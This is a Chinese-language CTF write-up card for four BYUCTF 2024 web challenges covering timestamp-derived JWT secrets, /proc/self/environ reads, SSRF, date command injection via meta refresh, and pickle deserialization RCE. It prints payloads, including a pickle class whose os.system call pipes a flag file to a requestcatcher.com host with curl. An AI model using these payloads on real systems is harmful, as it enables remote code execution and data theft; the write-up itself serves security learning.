---
title: BYUCTF 2024/4 题合集
contest: BYUCTF
year: 2024
difficulty: medium
vuln_type:
- jwt
- ssrf
- ssti
- deserialize
- rce
tags:
- 时间戳 secret 爆破
- /proc/self/environ
- secret cookie bypass
- date 命令注入
- meta refresh SSRF
- XSS requestcatcher
- pickle RCE
- random port 探测
attack_chain:
- 题 1: JWT secret = sha256(time_started)，前端响应泄露运行秒数 → 算 time_started → 爆破 secret
  - 用合法 secret 签 userid=0 token，/api/file?filename=/proc/self/environ 读 secret_path
  - 读 /<secret_path>/flag.txt
- 题 2: /api/date?modifier= 命令注入，但 url 过滤 date 和 %，用 meta refresh 触发
  - payload: <meta http-equiv=refresh content='0;url=...date?modifier=`cat /ctf/flag.txt|curl ...`'>
  - 通过 /api/stats POST username 存储 XSS payload，再 GET 触发
- 题 3: /query?url= SSRF（限制 127.0.0.1），用 secret cookie 验证 + URL 解析
  - 利用 SSRF 访问 internal service
- 题 4: /pickle?pickle=<hex> pickle 反序列化 RCE
  - 写 RCE 类 __reduce__ 返回 os.system
  - 端口 5700-6000 随机，先用 fetch 探测再发 payload
key_payload: "class RCE: def __reduce__(self): return os.system, ('cat /ctf/flag.txt|curl https://[yours].requestcatcher.com -X POST -d @-',)"
one_liner: 时间戳爆破 JWT secret + meta refresh SSRF + pickle RCE + secret cookie bypass
lesson: "HS256 弱 secret 用 sha256(timestamp) 是常见 CTF 套路；date 命令注入绕过用 meta refresh 不走 URL"
quality: high
---

# BYUCTF 2024/4 题合集

**时间戳 JWT secret + meta refresh SSRF + pickle RCE + 端口探测**

> BYUCTF · 2024 · medium · jwt/ssrf/ssti/deserialize/rce · quality=high
> 思路: 时间戳爆破 JWT secret → 算 userid=0 token → 读 /proc/self/environ 拿 secret_path → meta refresh SSRF 触发 date modifier 命令注入 → pickle RCE
> 套路: HS256 弱 secret 用 sha256(timestamp) 是常见 CTF 套路；date 命令注入绕过用 meta refresh 不走 URL

**关键 payload**:
```python
class RCE:
    def __reduce__(self):
        return os.system, ('cat /ctf/flag.txt|curl https://[yours].requestcatcher.com -X POST -d @-',)
```
